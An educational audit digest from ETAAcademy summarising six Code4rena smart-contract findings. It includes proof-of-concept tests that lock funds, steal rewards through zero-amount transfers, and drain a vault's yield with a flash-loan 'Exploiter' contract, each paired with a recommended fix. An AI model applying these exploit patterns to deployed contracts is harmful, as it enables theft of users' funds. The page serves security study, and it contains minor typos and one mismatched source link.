# ETAAcademy-Adudit: 1. Openzeppelin

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. Openzeppelin</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>library</th>
          <td>openzeppelin</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] `maxYieldVaultWithdraw()` uses `yieldVault.convertToAssets()`

### ERC4626: `convertToAssets` and `convertToShares` replaced with `preview`

- Summary: convertToAssets and convertToShares functions could be replaced with yield vault's preview functions for accurate accounting based on current conditions. However, since preview functions may revert, they must be used carefully in prize vault functions like maxDeposit, maxWithdraw, ensuring they don't revert.

- Impact & Recommendation: Use yieldVault.previewRedeem(yieldVault.maxRedeem(address(this))).
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-01-the-winner-can-steal-claimer-fees-and-force-him-to-pay-for-the-gas) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function _maxYieldVaultWithdraw() internal view returns (uint256) {
        return yieldVault.convertToAssets(yieldVault.maxRedeem(address(this)));
    }

  ```

  </details>

## 2.[Medium] Funds locked due to missing transfer check

### Two corner cases of ERC-20 and ERC-4246

- Summary: ERC-4626 does not guarantee transferring a specific amount of assets during redemption; only the specified shares are burned. When the contract tries to redeem shares for assets but receives feer shares than expected, leading to an insufficient asset balance. Despite the failed asset transfer, the ERC-20 compliant token only returns **`false`** instead of reverting the transaction. As a result, users’ assets become locked in the PrizeVault contract.

- Impact & Recommendation: To fix the problems, use OpenZeppelin's SafeERC20 safeTransfer for ERC-20 transfers and withdraw the necessary shares from the yield vault, either directly or after previewWithdraw/redeem.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-06-funds-locked-due-to-missing-transfer-check) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    // Place in test/unit/PrizeVault/PoCLockedFunds.t.sol
    pragma solidity ^0.8.24;
    import { UnitBaseSetup } from "./UnitBaseSetup.t.sol";
    import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
    import { ERC20PermitMock } from "../../contracts/mock/ERC20PermitMock.sol";
    import { ERC4626Mock } from "openzeppelin/mocks/ERC4626Mock.sol";
    import { Math } from "openzeppelin/utils/math/Math.sol";
    // An ERC20-compliant token that does not throw on insufficient balance.
    contract NoRevertToken is IERC20 {
        uint8   public decimals = 18;
        uint256 public totalSupply;
        mapping (address => uint)                      public balanceOf;
        mapping (address => mapping (address => uint)) public allowance;
        constructor(uint _totalSupply) {
            totalSupply = _totalSupply;
            balanceOf[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        }
        function transfer(address dst, uint wad) external returns (bool) {
            return transferFrom(msg.sender, dst, wad);
        }
        function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {
            if (balanceOf[src] < wad) return false;                        // insufficient src bal
            if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
                if (allowance[src][msg.sender] < wad) return false;        // insufficient allowance
                allowance[src][msg.sender] = allowance[src][msg.sender] - wad;
            }
            balanceOf[src] -= wad;
            balanceOf[dst] += wad;
            emit Transfer(src, dst, wad);
            return true;
        }
        function approve(address usr, uint wad) virtual external returns (bool) {
            allowance[msg.sender][usr] = wad;
            emit Approval(msg.sender, usr, wad);
            return true;
        }
    }
    // An ERC4626-compliant (yield) vault.
    // `withdraw(assets)` burns `assets * totalSupply / (totalAssets + 1)` shares.
    // `redeem(shares)` transfers `shares * (totalAssets + 1) / (totalSupply + 1)` assets.
    contract YieldVault is ERC4626Mock {
        using Math for uint256;
        constructor(address _asset) ERC4626Mock(_asset) {}
        function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
            return assets.mulDiv(totalSupply(), totalAssets() + 1);
        }
    }
    // Demonstrate that all of Alice's funds are locked in the PrizeVault,
    // with all corresponding shares burned.
    contract PoCLockedFunds is UnitBaseSetup {
        NoRevertToken asset;
        function setUpUnderlyingAsset() public view override returns (ERC20PermitMock) {
            return ERC20PermitMock(address(asset));
        }
        function setUpYieldVault() public override returns (IERC4626) {
            return new YieldVault(address(underlyingAsset));
        }
        function setUp() public override {
            return;
        }
        function test_poc_lockedFundsOnLossyWithdrawal() public {
            uint256 deposited = 1e18;
            // Mint 10^18 tokens and transfer them to Alice.
            asset = new NoRevertToken(deposited);
            super.setUp();
            asset.transfer(alice, deposited);
            // Alice holds all tokens, the yield vault and the price vaults are empty.
            assertEq(underlyingAsset.balanceOf(alice), deposited);
            assertEq(underlyingAsset.balanceOf(address(vault)), 0);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), 0);
            assertEq(yieldVault.totalSupply(), 0);
            assertEq(yieldVault.balanceOf(address(vault)), 0);
            assertEq(vault.totalSupply(), 0);
            assertEq(vault.balanceOf(alice), 0);
            // Alice enters the vault.
            vm.startPrank(alice);
            underlyingAsset.approve(address(vault), deposited);
            vault.deposit(deposited, alice);
            // All assets were transferred into the yield vault,
            // as many yield vault shares were minted to the prize vault, and
            // as many prize vault shares were minted to Alice.
            assertEq(underlyingAsset.balanceOf(alice), 0);
            assertEq(underlyingAsset.balanceOf(address(vault)), 0);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), deposited);
            assertEq(yieldVault.totalSupply(), deposited);
            assertEq(yieldVault.balanceOf(address(vault)), deposited);
            assertEq(vault.totalSupply(), deposited);
            assertEq(vault.balanceOf(alice), deposited);
            // Perform the lossy withdraw.
            vault.withdraw(deposited, alice, alice);
            // At this point Alice should've received all her assets back,
            // and all prize/yield vault shares should've been burned.
            // In contrast, no assets were transferred to Alice,
            // but (almost) all shares have been burned.
            assertEq(underlyingAsset.balanceOf(alice), 0);
            assertEq(underlyingAsset.balanceOf(address(vault)), 999999999999999999);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), 1);
            assertEq(yieldVault.totalSupply(), 1);
            assertEq(yieldVault.balanceOf(address(vault)), 1);
            assertEq(vault.totalSupply(), 0);
            assertEq(vault.balanceOf(alice), 0);
            // As a result, Alice's funds are locked in the vault;
            // she cannot even withdraw a single asset.
            vm.expectRevert();
            vault.withdraw(1, alice, alice);
            vm.expectRevert();
            vault.redeem(1, alice, alice);
        }
    }


  ```

  </details>

## 3.[High] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions

### Transfer or burn 0 ERC-20 token

- Summary: Users can manipulate the holders array in the LiquidInfrastructureERC20 contract by transferring or burning tokens with an amount of 0. This allows them to add their address multiple times to the array, leading to unfair distribution of rewards.

- Impact & Recommendation: Adjust the logic in `_beforeTokenTransfer` to ignore burns, transfers where the amount is `0`, and transfers where the recipient already has a positive balance.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#h-01-holders-array-can-be-manipulated-by-transferring-or-burning-with-amount-0-stealing-rewards-or-bricking-certain-functions) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)

  <details><summary>POC</summary>

  ```solidity
    it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
        const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
        const nft = await deployLiquidNFT(nftAccount1);
        const erc20 = await deployERC20A(erc20Owner);
        await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
        await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
        await infraERC20.addManagedNFT(await nft.getAddress());
        await infraERC20.setDistributableERC20s([await erc20.getAddress()]);
        const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'
        await infraERC20.approveHolder(holder1.address);
        await infraERC20.approveHolder(holder2.address);
        // Malicious user transfers 0 to himself to add himself to the holders array
        await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);
        // Setup balances
        await infraERC20.mint(holder1.address, parseEther('1'));
        await infraERC20.mint(holder2.address, parseEther('1'));
        await erc20.mint(await nft.getAddress(), parseEther('2'));
        await infraERC20.withdrawFromAllManagedNFTs();
        // Distribute to all holders fails because holder1 is in the holders array twice
        // Calling distribute with 2 sends all funds to holder1
        await mine(500);
        await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
        await expect(() => infraERC20.distribute(2))
            .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
        expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
    });
    it("malicious user can add zero address to holders array", async function () {
        const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();
        for (let i = 0; i < 10; i++) {
            await infraERC20.burn(0);
        }
        // I added a getHolders view function to better see this vulnerability
        expect((await infraERC20.getHolders()).length).to.eq(10);
    });

  ```

  </details>

## 4.[Medium] PrincipalToken is not ERC-5095 compliant

### ERC-5095 withdraw & redeem

- Summary: PrincipalToken doesn't meet ERC-5095 standards, causing potential integration issues. The contract's redeem, withdraw, maxWithdraw, and maxRedeem functions fail to meet the requirements specified by ERC-5095. These include supporting redemption and withdrawal flows where the sender has approval over the owner's tokens, not reverting in certain cases, and returning 0 when withdrawals or redemptions are disabled.

- Impact & Recommendation: PrincipalToken's redeem and withdraw functions need adjustment to allow msg.sender to have EIP-20 approval over the owner's tokens. Similarly, maxRedeem and maxWithdraw functions should return 0 when PrincipalToken is paused.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-01-principaltoken-is-not-erc-5095-compliant) & [Report](https://code4rena.com/reports/2024-02-spectra)

  <details><summary>POC</summary>

  ```solidity
      //copy-paste into `PrincipalToken.sol`
    function testRedeemDoesNotSupportERC20ApprovalFlow() public {
        uint256 amountToDeposit = 1e18;
        uint256 expected = _testDeposit(amountToDeposit, address(this));
        _increaseTimeToExpiry();
        principalToken.storeRatesAtExpiry();
        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
        vm.startPrank(MOCK_ADDR_5);
        vm.expectRevert();
        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
        principalToken.redeem(expected, MOCK_ADDR_5, address(this));
        vm.stopPrank();
    }

    function testWithdrawDoesNotSupportERC20ApprovalFlow() public {
        uint256 amount = 1e18;
        underlying.approve(address(principalToken), amount);
        principalToken.deposit(amount, testUser);
        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
        vm.prank(MOCK_ADDR_5);
        vm.expectRevert();
        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
        principalToken.withdraw(amount, MOCK_ADDR_5, testUser);
        vm.stopPrank();
    }

  ```

  </details>

## 5.[Medium] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract

### ERC4626 deflation attack

- Summary: A vulnerability in the IBT vault enables a flash loan attack using the PrincipalToken contract's lending feature. By borrowing the entire IBT balance, an attacker can exploit the vault's share price formula, resetting it to the default value 1 and causing significant losses to users, who may lose all accumulated yield and more, depending on the IBT price.

- Impact & Recommendation: In the PrincipalToken::flashLoan function, verify that the IBT rate/price has not decreased once the flash loan has been repaid.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-02-all-yield-generated-in-the-ibt-vault-can-be-drained-by-performing-a-vault-deflation-attack-using-the-flash-loan-functionality-of-the-principal-token-contract) & [Report](https://code4rena.com/reports/2024-02-spectra)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.20;
    import {ContractPrincipalToken} from "./PrincipalToken4.t.sol";
    import "openzeppelin-contracts/interfaces/IERC4626.sol";
    import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
    contract PrincipalTokenIBTDelfation is ContractPrincipalToken {
        function testDeflateIBTVault() public {
            // TEST_USER_1 deposits 1 IBT into the principal token contract
            vm.startPrank(TEST_USER_1);
            underlying.mint(TEST_USER_1, 1e18 - 1); // -1 because TEST_USER_1 already has 1 wei of IBT
            underlying.approve(address(ibt), 1e18 - 1);
            ibt.deposit(1e18 - 1, TEST_USER_1);
            ibt.approve(address(principalToken), 1e18);
            principalToken.depositIBT(1e18, TEST_USER_1);
            vm.stopPrank();
            // TEST_USER_2 deposits 9 IBT into the principal token contract
            vm.startPrank(TEST_USER_2);
            underlying.mint(TEST_USER_2, 9e18);
            underlying.approve(address(ibt), 9e18);
            ibt.deposit(9e18, TEST_USER_2);
            ibt.approve(address(principalToken), 9e18);
            principalToken.depositIBT(9e18, TEST_USER_2);
            vm.stopPrank();
            // Simulate vault interest accrual by manualy inflating the share price
            vm.startPrank(TEST_USER_3);
            uint256 generatedYield = 10e18;
            underlying.mint(TEST_USER_3, generatedYield);
            underlying.transfer(address(ibt), generatedYield);
            vm.stopPrank();
            // Execute exploit using the Exploiter contract
            Exploiter exploiterContract = new Exploiter();
            uint256 underlyingBalanceBeforeExploit = underlying.balanceOf(address(exploiterContract));
            principalToken.flashLoan(exploiterContract, address(ibt), 10e18, "");
            uint256 underlyingBalanceAfterExploit = underlying.balanceOf(address(exploiterContract));
            assertEq(underlyingBalanceBeforeExploit, 0);
            assertEq(underlyingBalanceAfterExploit, generatedYield); // All of the generated yield got stollen by the attacker
        }
    }
    contract Exploiter is IERC3156FlashBorrower {
        function onFlashLoan(
            address initiator,
            address token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {
            IERC4626 ibt = IERC4626(token);
            ibt.redeem(amount, address(this), address(this));
            IERC20(ibt.asset()).approve(address(ibt), type(uint256).max);
            ibt.mint(amount + fee, address(this));
            ibt.approve(msg.sender, amount + fee);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }
    }

  ```

  </details>

## 6.[High] UniV3LiquidityAMO::recoverERC721 will cause ERC721 tokens to be permanently locked in rdpxV2Core

### Lacks ERC721-related functions

- Summary: UniV3LiquidityAMO's recoverERC721 function allows only the admin to transfer ERC721 tokens to the RdpxV2Core contract. However, the transfer of ERC721 tokens to RdpxV2Core is ineffective as RdpxV2Core and its inherited contracts lack the logic to handle ERC721 tokens. Additionally, transferring ERC721 tokens with tokenId == 0 is not feasible due to validation checks.

- Impact & Recommendation: RdpxV2Core lacks ERC721-related functions, as evident from its code. Solutions include implementing additional ERC721 recovery functions in RdpxV2Core or modifying UniV3LiquidityAMO::recoverERC721 to transfer all NFTs to msg.sender instead of RdpxV2Core.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-04-univ3liquidityamorecovererc721-will-cause-erc721-tokens-to-be-permanently-locked-in-rdpxv2core) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
  pragma solidity ^0.8.19;
    import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
    contract MockERC721 is ERC721
    {
        constructor() ERC721("...", "...")
        {
        }
        function giveNFT() public
        {
            _mint(msg.sender, 1);
        }
    }

    function testNFT() public
    {
        // needed `import "../../contracts/mocks/MockERC721.sol";` at the beginning of the file
        MockERC721 mockERC721 = new MockERC721();
        mockERC721.giveNFT();
        mockERC721.transferFrom(address(this), address(rdpxV2Core), 1);

        // approveContractToSpend won't be possible to use
        vm.expectRevert();
        rdpxV2Core.approveContractToSpend(address(mockERC721), address(this), 1);
    }

  ```

  </details>
